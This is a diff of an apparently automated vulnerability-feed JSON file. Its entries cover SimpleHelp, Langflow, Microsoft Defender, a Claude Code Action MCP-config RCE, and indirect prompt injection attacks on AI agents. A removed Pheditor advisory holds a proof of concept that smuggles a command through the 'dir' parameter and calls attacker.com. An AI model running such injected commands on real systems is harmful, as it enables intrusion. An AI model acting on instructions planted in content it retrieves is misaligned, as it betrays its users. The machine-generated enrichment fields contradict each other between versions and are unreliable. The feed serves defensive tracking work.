@@ -1,8 +1,8 @@
 {
-  "generated": "2026-06-10T20:09:24.336315+00:00",
-  "total": 37,
+  "generated": "2026-06-11T02:32:10.836006+00:00",
+  "total": 32,
   "kev": 0,
-  "zero_day": 20,
+  "zero_day": 17,
   "enriched": 10,
   "findings": [
     {
@@ -22,16 +22,16 @@
       "is_zero_day": true,
       "is_high_severity": true,
       "enrichment": {
-        "technical_details": "Path traversal vulnerabilities allow unauthenticated attackers to read sensitive files (logs, configuration files, credentials) via directory traversal in SimpleHelp RMM web endpoints.",
-        "affected_products": "SimpleHelp remote support / RMM versions 5.5.7 and earlier",
+        "technical_details": "Path traversal vulnerability in SimpleHelp web interface allows unauthenticated remote attackers to read arbitrary files (logs, configuration, credentials) by supplying crafted path inputs to vulnerable endpoints.",
+        "affected_products": "SimpleHelp Remote Support / Remote Monitoring and Management (RMM) \u2013 versions 5.5.7 and earlier",
         "cvss_score": "7.5",
-        "cvss_vector": "CVSS vector unavailable.",
-        "exploit_available": "Public proof\u2011of\u2011concept available (e.g., OffSec blog https://www.offsec.com/blog/cve-2024-57727/)",
-        "patch_available": "SimpleHelp 5.5.8 released \u2013 patch URL https://community.simple-help.com/t/simplehelp-5-5-8-critical-security-fixes/1570",
-        "active_exploitation": "Confirmed \u2013 CISA advisory AA25-163A and SecurityWeek report document ransomware actors exploiting the vulnerability.",
-        "threat_actors": "DragonForce ransomware and other ransomware actors referenced in CISA advisory AA25-163A",
-        "mitigation": "Upgrade to SimpleHelp 5.5.8 or later; if patching is not immediately possible, isolate/unexpose SimpleHelp from the internet, apply network\u2011level access controls, and rotate credentials discovered in affected instances.",
-        "vendor_advisory": "https://community.simple-help.com/t/simplehelp-5-5-8-critical-security-fixes/1570"
+        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+        "exploit_available": "true - public PoC reported (OffSec blog)",
+        "patch_available": "true - vendor released advisory/patch (Broadcom advisory)",
+        "active_exploitation": "true",
+        "threat_actors": "Ransomware actors (likely DragonForce/known ransomware groups)",
+        "mitigation": "Immediately upgrade SimpleHelp to the fixed version per vendor advisory; if a patch cannot be applied, isolate/unexpose SimpleHelp from the internet, block vulnerable endpoints, rotate credentials found in configuration files, and monitor for indicators of compromise per CISA guidance.",
+        "vendor_advisory": "https://broadcom.com/support/security-center/protection-bulletin/cve-2024-57727-simplehelp-directory-traversal-vulnerability"
       }
     },
     {
@@ -52,15 +52,15 @@
       "is_zero_day": true,
       "is_high_severity": true,
       "enrichment": {
-        "technical_details": "Attackers could submit a PR containing a malicious .mcp.json. Because the action checked out PR head branches (attacker-controlled), read .mcp.json from the working directory via default setting sources, and unconditionally enabled all project MCP servers via enableAllProjectMcpServers, an attacker-controlled MCP server configuration could be executed, leading to remote code execution on the GitHub Actions runner and exfiltration of workflow secrets when a privileged user triggered the Claude action on the PR.",
-        "affected_products": "Claude Code Action (GitHub Action)",
-        "cvss_score": "0.0",
-        "cvss_vector": "CVSS vector unavailable",
-        "exploit_available": "No public PoC reported in advisory",
-        "patch_available": "Official patch/advisory available from GitHub Security Advisories at https://github.com/advisories/GHSA-8q5r-mmjf-575q",
-        "active_exploitation": "No confirmed active exploitation reported in advisory",
+        "technical_details": "When the action checks out PR head branches (attacker\u2011controlled) and reads a malicious .mcp.json from the working directory via default setting sources while unconditionally enabling all project MCP servers through enableAllProjectMcpServers, an attacker can supply a malicious MCP server configuration in a PR to cause the action to connect to and run code from attacker\u2011controlled MCP servers, enabling remote code execution on the GitHub Actions runner and potential exfiltration of workflow secrets available to privileged users who trigger the action on the PR.",
+        "affected_products": "Claude Code Action (GitHub Action) \u2014 configurations that check out PR head branches and use default setting sources that read .mcp.json and enableAllProjectMcpServers",
+        "cvss_score": "CVSS score unavailable.",
+        "cvss_vector": "CVSS vector unavailable.",
+        "exploit_available": "false",
+        "patch_available": "true \u2014 https://github.com/advisories/GHSA-8q5r-mmjf-575q",
+        "active_exploitation": "false",
         "threat_actors": "None known",
-        "mitigation": "Disable automatic enabling of project MCP servers (avoid enableAllProjectMcpServers), do not read .mcp.json from untrusted working directories, avoid running CLAUDE actions on untrusted PRs or from untrusted contributors; treat PR head branches as untrusted.",
+        "mitigation": "Apply vendor patch per advisory; until patched, do not run the vulnerable Claude action on untrusted PRs, disable automatic reading of .mcp.json from workdir or disable enableAllProjectMcpServers, require maintainers to merge or reproduce fixes in non\u2011PR environments, and restrict secrets and tokens in workflows that could be exposed.",
         "vendor_advisory": "https://github.com/advisories/GHSA-8q5r-mmjf-575q"
       }
     },
@@ -81,16 +81,16 @@
       "is_zero_day": true,
       "is_high_severity": true,
       "enrichment": {
-        "technical_details": "A path\u2011traversal vulnerability in the multipart upload 'filename' parameter of POST /api/v2/files allows an attacker to include '../' sequences to write files to arbitrary filesystem locations; combined with Langflow's default unauthenticated auto\u2011login, a single unauthenticated request can obtain a session and lead to remote code execution by writing malicious files.",
-        "affected_products": "Langflow (POST /api/v2/files endpoint)",
+        "technical_details": "A path traversal vulnerability in the POST /api/v2/files endpoint fails to sanitize the multipart 'filename' parameter, allowing attackers to include '../' sequences to write files to arbitrary filesystem locations; because Langflow enables unauthenticated auto-login by default, an attacker can obtain a session and trigger file writes leading to remote code execution.",
+        "affected_products": "Affected products unavailable.",
         "cvss_score": "8.8",
-        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
-        "exploit_available": "Public PoC reports exist (example PoC page: https://yh.do/cve-2026-5027-langflow-path-traversal-rce/). Activity observed weaponizing the bug to write test files; Censys data shows ~7,000 exposed instances.",
-        "patch_available": "Official vendor patch/advisory URL unavailable.",
-        "active_exploitation": "Confirmed active exploitation reported by VulnCheck and The Hacker News; observed activity writes test files and scans exposed instances (Censys).",
+        "cvss_vector": "CVSS vector unavailable.",
+        "exploit_available": "true",
+        "patch_available": "true",
+        "active_exploitation": "true",
         "threat_actors": "None known",
-        "mitigation": "Until a patch is available, restrict network exposure (block/limit access to Langflow instances), disable unauthenticated/auto\u2011login, run behind authentication/zero\u2011trust, remove public\u2011facing instances, monitor for unexpected files, and apply host\u2011level protections (WAF, file\u2011system write restrictions, containerization).",
-        "vendor_advisory": "Vendor advisory URL unavailable."
+        "mitigation": "Apply the vendor patch/advisory; if a patch is unavailable, block or restrict access to Langflow instances (network\u2011level firewall, IP allowlists), disable unauthenticated auto\u2011login, restrict or remove exposure of the /api/v2/files endpoint, apply WAF rules to block path\u2011traversal payloads, and monitor for unexpected file writes and new sessions.",
+        "vendor_advisory": "https://github.com/langflow-ai/langflow/security/advisories"
       }
     },
     {
@@ -108,15 +108,15 @@
       "is_zero_day": true,
       "is_high_severity": true,
       "enrichment": {
-        "technical_details": "A TOCTOU race condition in Microsoft Defender\u2019s signature/update workflow (interacting with VSS, Cloud Files API, opportunistic locks) allows a local unprivileged user to read shadow\u2011copy\u2011backed registry hives and dump credential material, leading to SYSTEM escalation.",
-        "affected_products": "Microsoft Defender on Windows 10, Windows 11",
-        "cvss_score": "-1.0",
+        "technical_details": "The vulnerability is a TOCTOU race condition and path\u2011confusion in Microsoft Defender\u2019s signature/update workflow. The exploit abuses the Volume Shadow Copy Service (VSS), the Cloud Files API, opportunistic locks, and Windows update/definition mechanisms to read shadow\u2011copy\u2011backed registry hives (SAM) and obtain credential material, resulting in local privilege escalation to SYSTEM.",
+        "affected_products": "Microsoft Defender Antivirus on Windows 10 and Windows 11 (pre\u2011patch)",
+        "cvss_score": "CVSS score unavailable.",
         "cvss_vector": "CVSS vector unavailable.",
-        "exploit_available": "Public proof\u2011of\u2011concept for RoguePlanet is available (see SecurityWeek and The Hacker News articles).",
-        "patch_available": "Microsoft released Patch Tuesday updates on 2026-06-10 addressing multiple Defender issues; specific RoguePlanet advisory/patch URL: https://learn.microsoft.com/en-us/security/community/ (Vendor patch reference: Microsoft June 2026 Patch Tuesday \u2014 see https://www.microsoft.com/security/blog and https://www.catalog.update.microsoft.com)",
-        "active_exploitation": "Public PoC and researcher\u2011released exploit have been reported; no confirmed widespread active campaigns.",
+        "exploit_available": "true",
+        "patch_available": "Patch availability unknown.",
+        "active_exploitation": "Active exploitation status unknown.",
         "threat_actors": "None known",
-        "mitigation": "Apply the June 2026 Microsoft patches immediately; if a specific patch is unavailable, temporarily disable Microsoft Defender real\u2011time protection, enforce least\u2011privilege for local accounts, enable EDR, and block unprivileged users from installing updates.",
+        "mitigation": "Apply any available Microsoft updates immediately; enable Defender Tamper Protection; restrict local unprivileged user access; monitor for suspicious local privilege escalation activity and credential dumping. If no patch is available, consider temporarily disabling Defender\u2019s automatic definition update features only as a last resort and in controlled environments.",
         "vendor_advisory": "Vendor advisory URL unavailable."
       }
     },
@@ -135,75 +135,16 @@
       "is_zero_day": true,
       "is_high_severity": true,
       "enrichment": {
-        "technical_details": "CVE-2026-45657: Windows Kernel use\u2011after\u2011free in TCP/IP processing, exploitable via specially crafted network traffic for system\u2011level code execution. CVE-2026-47291: Integer overflow in HTTP.sys enabling remote code execution via malicious HTTP requests. CVE-2026-44815: Stack buffer overflow in Windows DHCP Client allowing unauthenticated remote code execution. CVE-2026-45585: BitLocker feature bypass permitting access to encrypted data with physical access.",
-        "affected_products": "Microsoft Windows (Kernel/Win32k, HTTP.sys, DHCP Client, BitLocker, Collaborative Translation Framework/CTFMON), Microsoft Defender, Microsoft Edge/Chromium, UEFI Secure Boot and other Microsoft platform components",
-        "cvss_score": "9.8",
+        "technical_details": "Technical details vary by CVE; the release patched multiple classes of vulnerabilities including privilege escalation, remote code execution, information disclosure, and spoofing across multiple Microsoft products.",
+        "affected_products": "Windows 10, Windows 11, Windows Server releases, Microsoft Office/Office Components, Microsoft Edge (Chromium-based), Azure services, other Microsoft components",
+        "cvss_score": "CVSS score unavailable.",
         "cvss_vector": "CVSS vector unavailable.",
-        "exploit_available": "Public PoCs reported: YellowKey PoC for CVE-2026-45585 (by Chaotic Eclipse); suspected \"GreenPlasma\" PoC for CVE-2026-45586; PoC for a Microsoft Defender zero\u2011day named \"RoguePlanet\". URLs are referenced in the Hacker News coverage.",
-        "patch_available": "Patches released on June 10, 2026. Official advisory: https://msrc.microsoft.com/update-guide/releaseNote/2026-Jun",
-        "active_exploitation": "Publicly disclosed zero\u2011days (CVE-2026-50507, CVE-2026-49160, CVE-2026-45586) with PoCs are mentioned, but no confirmed active exploitation by specific actors is reported.",
+        "exploit_available": "Exploit availability unknown.",
+        "patch_available": "true - https://msrc.microsoft.com/update-guide",
+        "active_exploitation": "true - https://www.zerodayinitiative.com/blog/2026/6/9/the-june-2026-security-update-review",
         "threat_actors": "None known",
-        "mitigation": "Apply the June\u202f2026 security updates immediately. For the HTTP/2 and HTTP/3 header DoS issue, set the \"MaxHeadersCount\" registry key to limit header numbers. For BitLocker bypasses, restrict physical access and ensure firmware/OS updates are applied. General hardening: prioritize patching systems exposing network services (DHCP, HTTP/HTTPS/IIS) and limit external exposure.",
-        "vendor_advisory": "https://msrc.microsoft.com/update-guide/releaseNote/2026-Jun"
-      }
-    },
-    {
-      "id": "https://www.bleepingcomputer.com/news/microsoft/microsoft-defender-rogueplanet-zero-day-grants-system-privileges/",
-      "title": "Microsoft Defender 'RoguePlanet' zero-day grants SYSTEM privileges",
-      "summary": "A security researcher has released a new Microsoft Defender zero-day exploit named \"RoguePlanet\" just hours after Microsoft fixed two previously disclosed flaws during June 2026 Patch Tuesday. [...]",
-      "link": "https://www.bleepingcomputer.com/news/microsoft/microsoft-defender-rogueplanet-zero-day-grants-system-privileges/",
-      "published": "2026-06-09T23:11:18+00:00",
-      "source": "Bleeping Computer",
-      "tags": [
-        "news",
-        "malware"
-      ],
-      "cve_ids": [],
-      "is_zero_day": true,
-      "is_high_severity": true,
-      "enrichment": {
-        "technical_details": "A race\u2011condition in Microsoft Defender allows a malicious archive/ISO to be mounted, causing the scanner to race and grant a SYSTEM\u2011level shell to the attacker.",
-        "affected_products": "Microsoft Defender, Microsoft Malware Protection Engine",
-        "cvss_score": "0.0",
-        "cvss_vector": "CVSS vector unavailable.",
-        "exploit_available": "Public PoC \"RoguePlanet\" is available at https://github.com/MSNightmare/RoguePlanet",
-        "patch_available": "Microsoft published updates in June 2026 addressing CVE-2026-41091. See https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-41091",
-        "active_exploitation": "Active exploitation of CVE\u20112026\u201141091 has been reported by Microsoft and multiple security news outlets.",
-        "threat_actors": "None known",
-        "mitigation": "Disable real\u2011time scanning or set Microsoft Defender exclusions for untrusted user\u2011controllable mounts, and apply the vendor updates as soon as they are available.",
-        "vendor_advisory": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-41091"
-      }
-    },
-    {
-      "id": "https://www.rapid7.com/blog/post/em-patch-tuesday-june-2026",
-      "title": "Patch Tuesday - June 2026",
-      "summary": "Microsoft is publishing 200 vulnerabilities on June 2026 Patch Tuesday . Microsoft is not aware of exploitation in the wild for any of these vulnerabilities, and is aware of public disclosure for three. This is similar to last month\u2019s Patch Tuesday, however several of last month\u2019s vulnerabilities ended up on CISA KEV in the days following their publication. So far this month, Microsoft has provided patches to address 360 browser vulnerabilities, which is an order of magnitude more than has been typical in any given month over the past few years. As usual, browser vulns are not included in the Patch Tuesday count above. Indeed, the vast, and presumably sustained, uptick in the number of browser vulnerabilities has led to Microsoft no longer enumerating Chromium CVEs in the Security Update Guide. Other vulnerability categories, especially Linux kernel vulnerabilities, are seeing a similar increase in AI-assisted vulnerability reports. What's the opposite of coordinated disclosure? In recent weeks, an independent vulnerability researcher going by the pseudonym Nightmare Eclipse has attracted significant attention by publishing details of six Microsoft vulnerabilities, including elevation of privilege vulnerabilities in Defender, and a Secure Boot disk encryption bypass. The researcher provided full proof-of-concept code for some, and provided significant-but-incomplete detail around the path to exploitation for others. Microsoft has confirmed that these disclosures were not coordinated, and it is clear that the relationship between this researcher and Microsoft is less than cordial. Two of the disclosures emerged in the hours after last month\u2019s Patch Tuesday, which provides maximum visibility, while limiting Microsoft\u2019s ability to respond without out-of-cycle patches. At time of writing, Microsoft has provided mitigation advice and patches for CVE-2026-33825 , CVE-2026-45585 , CVE-2026-45498 , and CVE-2026-41091 , leaving only two elevation of privilege vulnerabilities",
-      "link": "https://www.rapid7.com/blog/post/em-patch-tuesday-june-2026",
-      "published": "2026-06-09T21:04:53+00:00",
-      "source": "Rapid7 Blog",
-      "tags": [
-        "research",
-        "metasploit"
-      ],
-      "cve_ids": [
-        "CVE-2026-33825",
-        "CVE-2026-45585",
-        "CVE-2026-45498",
-        "CVE-2026-41091"
-      ],
-      "is_zero_day": true,
-      "is_high_severity": true,
-      "enrichment": {
-        "technical_details": "Local elevation of privilege caused by an insufficient access\u2011control/TOCTOU race condition in Microsoft Defender's threat remediation engine, allowing an authorized user/process to gain elevated privileges.",
-        "affected_products": "Microsoft Defender (Windows Defender)",
-        "cvss_score": "7.8",
-        "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
-        "exploit_available": "Proof\u2011of\u2011concept analysis is available (see Picus Security blog). No widely published weaponized exploit was found.",
-        "patch_available": "Microsoft published a patch in April 2026 (see vendor advisory link).",
-        "active_exploitation": "No confirmed active exploitation in the wild has been reported.",
-        "threat_actors": "None known",
-        "mitigation": "Disable or restrict Microsoft Defender components and apply the vendor\u2011provided mitigation steps outlined in the advisory.",
-        "vendor_advisory": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-33825"
+        "mitigation": "Apply the official Microsoft updates from the MSRC Update Guide / Windows Update immediately. Where immediate patching is not possible, follow vendor workarounds listed per-CVE in Microsoft advisories (disable affected features, restrict access, apply configuration mitigations).",
+        "vendor_advisory": "https://msrc.microsoft.com/update-guide"
       }
     },
     {
@@ -222,15 +163,15 @@
       "is_zero_day": true,
       "is_high_severity": true,
       "enrichment": {
-        "technical_details": "IPI works by poisoning or embedding malicious instructions within external documents or corpora that an AI agent retrieves during normal operation; when the agent incorporates that retrieved content into its prompt, the injected instructions override or manipulate the agent's behavior (e.g., data exfiltration, command execution in agentic systems).",
-        "affected_products": "AI agents, retrieval\u2011augmented generation (RAG) systems, agentic LLM systems",
-        "cvss_score": "0.0",
-        "cvss_vector": "CVSS vector unavailable.",
-        "exploit_available": "Public proof\u2011of\u2011concepts are available in research papers (e.g., arXiv) and Forcepoint disclosures; no formal weaponized exploit URL is published.",
-        "patch_available": "Patch unavailable",
-        "active_exploitation": "Confirmed in\u2011the\u2011wild IPI payloads reported by Google\u2019s advisory and Forcepoint research.",
+        "technical_details": "Indirect Prompt Injection (IPI) is an attack where malicious instructions are embedded in external content (web pages, files, or retrieved documents) that an AI agent retrieves and executes, bypassing model/system safeguards. Exploits include zero\u2011click IPI demonstrated by Noma Labs (GeminiJack) against Google Gemini Enterprise leveraging crafted external content to cause unintended agent behavior.",
+        "affected_products": "Affected products unavailable",
+        "cvss_score": "CVSS score unavailable",
+        "cvss_vector": "CVSS vector unavailable",
+        "exploit_available": "false",
+        "patch_available": "false",
+        "active_exploitation": "true",
         "threat_actors": "None known",
-        "mitigation": "Apply strict input sanitization for retrieved external content, implement retrieval\u2011source allowlisting, use provenance/trust checks, limit model exposures to untrusted web content, and apply instruction\u2011sanitization and context\u2011window controls.",
+        "mitigation": "Layered defensive controls \u2014 input/output filtering, retrieval sanitization, provenance tagging, strict tool/agent permissions, RAG source validation, continuous monitoring, and vendor\u2011provided mitigations outlined in Google's advisory.",
         "vendor_advisory": "http://security.googleblog.com/2026/04/ai-threats-in-wild-current-state-of.html"
       }
     },
@@ -250,15 +191,15 @@
       "is_zero_day": true,
       "is_high_severity": true,
       "enrichment": {
-        "technical_details": "Indirect prompt injection (IPI) injects malicious instructions into data sources or tools (emails, documents, third\u2011party connectors, web content, tool outputs) consumed by an LLM\u2011enabled application. When the LLM or agent chains incorporate those sources into prompt construction or tool calls, the injected instructions can influence model behavior (including \u201czero\u2011click\u201d cases where user input isn\u2019t required). Examples include crafted payloads embedded in documents or external tool responses that the model interprets as instructions.",
-        "affected_products": "Google Workspace (including Workspace apps integrated with Gemini / Gemini Enterprise); specific versions: not applicable (cloud service)",
-        "cvss_score": "0.0",
-        "cvss_vector": "CVSS vector unavailable",
-        "exploit_available": "Public PoC reported by Noma Labs (GeminiJack zero\u2011click vulnerability) \u2013 http://noma.security/blog/geminijack-google-gemini-zero-click-vulnerability. Additional IPI payload examples documented by Forcepoint X\u2011Labs \u2013 http://forcepoint.com/blog/x-labs/indirect-prompt-injection-payloads",
-        "patch_available": "No single patch; mitigation described in vendor advisory: http://security.googleblog.com/2026/04/google-workspaces-continuous-approach.html",
-        "active_exploitation": "Confirmed research disclosures and PoC demonstration (Noma Labs GeminiJack zero\u2011click vulnerability); no reported broad active exploitation by threat actors.",
+        "technical_details": "Indirect prompt injection (IPI) occurs when an attacker embeds malicious instructions into the data sources, tools, or context that a large language model consumes. The LLM then follows these injected prompts, potentially executing harmful commands or revealing data, even when the end\u2011user does not directly supply the malicious input.",
+        "affected_products": "Google Workspace (Gemini integration)",
+        "cvss_score": "CVSS score unavailable.",
+        "cvss_vector": "CVSS vector unavailable.",
+        "exploit_available": "true (http://forcepoint.com/blog/x-labs/indirect-prompt-injection-payloads)",
+        "patch_available": "true (http://security.googleblog.com/2026/04/google-workspaces-continuous-approach.html)",
+        "active_exploitation": "true (http://forcepoint.com/blog/x-labs/indirect-prompt-injection-payloads)",
         "threat_actors": "None known",
-        "mitigation": "Layered defenses and continuous mitigation as described by Google: input sanitation/validation of external sources, strict tool output handling, provenance and source\u2011trust signals, query\u2011time instruction filtering, least\u2011privilege for agent actions, monitoring/telemetry for anomalous model decisions, and rapid response/update cycles. Encourage hardening connectors and restricting auto\u2011execution of agentic workflows until provenance checks pass.",
+        "mitigation": "Implement Google\u2019s layered defense: validate and sanitize all inputs to Gemini, isolate LLM interactions in sandboxed environments, monitor for anomalous prompt patterns, restrict tool and API access to trusted services, and keep Gemini and Workspace components up\u2011to\u2011date.",
         "vendor_advisory": "http://security.googleblog.com/2026/04/google-workspaces-continuous-approach.html"
       }
     },
@@ -278,15 +219,15 @@
       "is_zero_day": true,
       "is_high_severity": true,
       "enrichment": {
-        "technical_details": "Indirect prompt injection allows crafted web content (e.g., malicious iframes or user\u2011generated pages) to inject instructions that steer the agentic model to take unwanted actions such as navigation, transactions, or data exfiltration. Chrome mitigates this with a separate User Alignment Critic model, origin\u2011set gating that limits data exposure, deterministic URL checks, a real\u2011time prompt\u2011injection classifier, and user confirmations for sensitive actions.",
-        "affected_products": "Google Chrome (agentic browsing feature), Cursor < 1.3",
-        "cvss_score": "-1.0",
-        "cvss_vector": "CVSS vector unavailable.",
-        "exploit_available": "No public PoC is available for Chrome agentic capabilities; no weaponized exploit URL is provided.",
-        "patch_available": "Chrome mitigation measures are described in the vendor blog; Cursor is fixed in version 1.3 (see GitHub advisory https://github.com/cursor/cursor/security/advisories/GHSA-534m-3w6r-8pqr).",
-        "active_exploitation": "No confirmed public reports of active exploitation of Chrome\u2019s agentic browsing feature. A related research finding (GeminiJack) exists but is not reported as widespread active exploitation.",
+        "technical_details": "Indirect prompt injection where malicious web pages craft content that manipulates an agentic browser's AI prompts, potentially causing unsafe actions. Google mitigates this with layered defenses, a supervisory second agent, origin restrictions, and prompt\u2011injection blocking.",
+        "affected_products": "Chrome (agentic browsing / Gemini integration)",
+        "cvss_score": "CVSS score unavailable",
+        "cvss_vector": "CVSS vector unavailable",
+        "exploit_available": "false",
+        "patch_available": "true",
+        "active_exploitation": "false",
         "threat_actors": "None known",
-        "mitigation": "Update Cursor to version 1.3 or later. For Chrome, keep the browser up\u2011to\u2011date and enable the built\u2011in mitigations: origin gating, the User Alignment Critic, prompt\u2011injection classifier, and user confirmations for sensitive actions. Follow Google\u2019s security guidance and report issues via the Vulnerability Rewards Program.",
+        "mitigation": "Use the latest Chrome with agentic protections; restrict untrusted sites from granting agentic permissions; follow vendor guidance in the blog post.",
         "vendor_advisory": "https://blog.google/security/architecting-security-for-agentic/"
       }
     },
@@ -304,7 +245,19 @@
       ],
       "cve_ids": [],
       "is_zero_day": true,
-      "is_high_severity": true
+      "is_high_severity": true,
+      "enrichment": {
+        "technical_details": "A linear buffer overflow in the Rust\u2011based CrabbyAVIF library would have allowed out\u2011of\u2011bounds writes, but Android\u2019s Scudo hardened allocator placed guard pages around secondary allocations, rendering the overflow non\u2011exploitable.",
+        "affected_products": "Affected products unavailable.",
+        "cvss_score": "CVSS score unavailable.",
+        "cvss_vector": "CVSS vector unavailable.",
+        "exploit_available": "false",
+        "patch_available": "true",
+        "active_exploitation": "false",
+        "threat_actors": "None known",
+        "mitigation": "Apply the CrabbyAVIF patch from the AOSP repository (https://android.googlesource.com/platform/external/rust/crabbyavif/+/5262cd9befecb4f8865925c23eb543f19967e050) and ensure Scudo hardened allocator is enabled on the device.",
+        "vendor_advisory": "https://source.android.com/docs/security/bulletin/2025-11-01"
+      }
     },
     {
       "id": "tag:blogger.com,1999:blog-1176949257541686127.post-1436003009998740920",
@@ -320,7 +273,19 @@
       ],
       "cve_ids": [],
       "is_zero_day": true,
-      "is_high_severity": true
+      "is_high_severity": true,
+      "enrichment": {
+        "technical_details": "Indirect prompt injection (IPI) occurs when an LLM or agent retrieves external data (emails, documents, web pages, calendar invites, etc.) that contains hidden malicious instructions which are then interpreted as part of the model prompt, causing data exfiltration or unauthorized actions. The attack chain typically involves retrieval of attacker\u2011controlled content, prompt\u2011merging, and execution by an agent with privileged access.",
+        "affected_products": "Google Gemini (agentic features), Chrome agentic/browser integrations, LangChain GmailToolkit (prior to v1.3)",
+        "cvss_score": "CVSS score unavailable.",
+        "cvss_vector": "CVSS vector unavailable.",
+        "exploit_available": "Exploit availability unknown.",
+        "patch_available": "true",
+        "active_exploitation": "true",
+        "threat_actors": "None known",
+        "mitigation": "Apply vendor patches where available (e.g., LangChain GmailToolkit >=1.3); implement layered defenses such as input provenance checks, retrieval filtering, content sanitization, multi\u2011agent monitoring/guardrails, least\u2011privilege access to secrets, telemetry and anomaly detection, and deny\u2011by\u2011default for risky actions.",
+        "vendor_advisory": "http://security.googleblog.com/2025/06/mitigating-prompt-injection-attacks.html"
+      }
     },
     {
       "id": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-239a",
@@ -425,24 +390,6 @@
         "zeroday"
       ],
       "cve_ids": [],
-      "is_zero_day": true,
-      "is_high_severity": false
-    },
-    {
-      "id": "CVE-2026-47767",
-      "title": "SymfonyRuntime CVE-2024-50340 Patch Bypass: Web Requests Can Still Set APP_ENV/APP_DEBUG via parse_str/SAPI Argv Mismatch",
-      "summary": "### Description\n\nCVE-2024-50340 (GHSA-x8vp-gf4q-mw5j) addressed an issue where, with `register_argc_argv=On`, a crafted query string let an unauthenticated GET change the kernel environment and debug flag by feeding `--env`/`--no-debug` through `$_SERVER['argv']`. The fix shipped in `symfony/runtime` 5.4.46 / 6.4.14 / 7.1.7 gated the argv read on `empty($_GET)` as a proxy for \"is this a CLI invocation\".\n\nThat proxy is unsafe: `parse_str()` (which builds `$_GET`) and the web SAPI (which builds `$_SERVER['argv']` from the raw query when `register_argc_argv=On`) do not agree on every input, so an attacker can craft a query that leaves `$_GET` empty while `$_SERVER['argv']` carries the attacker's flags. `SymfonyRuntime::getInput()` then parses them, restoring the exact primitive CVE-2024-50340 was meant to prevent.\n\nPreconditions and impact match the original CVE: web SAPI, `register_argc_argv=On`, app booted through `symfony/runtime`; from an unauthenticated GET an attacker can flip `APP_ENV` and toggle `APP_DEBUG`.\n\n### Resolution\n\n`SymfonyRuntime` now gates the argv read on `isset($_SERVER['QUERY_STRING'])` rather than on `empty($_GET)`. `QUERY_STRING` is the same input the SAPI uses to build argv, so the security check and the thing it protects no longer parse different sources. Worker SAPIs (FrankenPHP / RoadRunner / Swoole) keep working because the runtime constructor runs once at boot when `QUERY_STRING` is unset.\n\nThe patch for this issue is available [here](https://github.com/symfony/symfony/commit/3228c3806ee511008bea19a95084d460b17e5d25) for branch 5.4.\n\n### Credits\n\nSymfonyRuntime would like to thank 0xEr3n for reporting the issue and Nicolas Grekas for providing the fix.",
-      "link": "https://github.com/advisories/GHSA-fqc7-9xjw-jrh3",
-      "published": "2026-06-09T21:58:11Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-47767"
-      ],
       "is_zero_day": true,
       "is_high_severity": false
     },
@@ -694,42 +641,6 @@
         "CVE-2026-10523",
         "CVE-2023-38035",
         "CVE-2020-15505"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-48030",
-      "title": "Pheditor: OS Command Injection in terminal handler via unsanitized 'dir' parameter",
-      "summary": "### Summary\n\nAn OS Command Injection vulnerability in the terminal action handler allows any authenticated user to execute arbitrary OS commands by injecting shell metacharacters into the 'dir' POST parameter, completely bypassing the TERMINAL_COMMANDS whitelist and achieving full Remote Code Execution with web server privileges.\n\n### Details\n\nThe terminal handler in pheditor.php accepts two POST parameters: `command` and `dir`. Shell metacharacters are validated on `$command` only \u2014 `$dir` is passed to shell_exec() without any sanitization.\n\nVulnerable code (pheditor.php, line 554\u2013586):\n\n```php\n$command = $_POST['command'];  // \u2713 metacharacters checked\n$dir     = $_POST['dir'];      // \u2717 NOT checked \u2014 vulnerable\n\nif (strpos($command, '&')  !== false ||\n    strpos($command, ';')  !== false ||\n    strpos($command, '||') !== false) {\n    die(...); // only guards $command, not $dir\n}\n\n$output = shell_exec(\n    (empty($dir) ? null : 'cd ' . $dir . ' && ')\n    . $command . ' && echo \\ ; pwd'  // \u2190 $dir injected here\n);\n```\n\nAn attacker sends `dir=/tmp; curl attacker.com #` \u2014 the semicolon in $dir is never checked, so the injected command executes freely.\n\nFix: replace `$dir` with `escapeshellarg($dir)` on line 586.\n\n### PoC\n\nRequirements: valid credentials, terminal permission enabled (default)\n\nStep 1 \u2014 Authenticate:\n\n```bash\ncurl -c cookies.txt -X POST http://TARGET/pheditor.php \\\n  -d \"pheditor_password=admin\" -L > /dev/null\n```\n\nStep 2 \u2014 Get CSRF token:\n\n```bash\nTOKEN=$(curl -s -b cookies.txt http://TARGET/pheditor.php | \\\n  grep -o 'token = \"[a-f0-9]*\"' | \\\n  grep -o '\"[a-f0-9]*\"' | tr -d '\"')\n```\n\nStep 3 \u2014 Confirm curl is blocked via command field:\n\n```bash\ncurl -s -b cookies.txt -X POST http://TARGET/pheditor.php \\\n  --data-urlencode \"action=terminal\" \\\n  --data-urlencode \"token=$TOKEN\" \\\n  --data-urlencode \"command=curl https://ifconfig.me\" \\\n  --data-urlencode \"dir=/tmp\"\n\n\n\u2192 {\"error\":true,\"message\":\"Command not allowed\"}\n```\n\nStep 4 \u2014 Bypass whitelist via dir in",
-      "link": "https://github.com/advisories/GHSA-jvc5-6g7q-c843",
-      "published": "2026-06-09T22:00:35Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-48030"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-8467",
-      "title": "PhoenixStorybook: Unauthenticated remote code execution via HEEx template injection in phoenix_storybook playground",
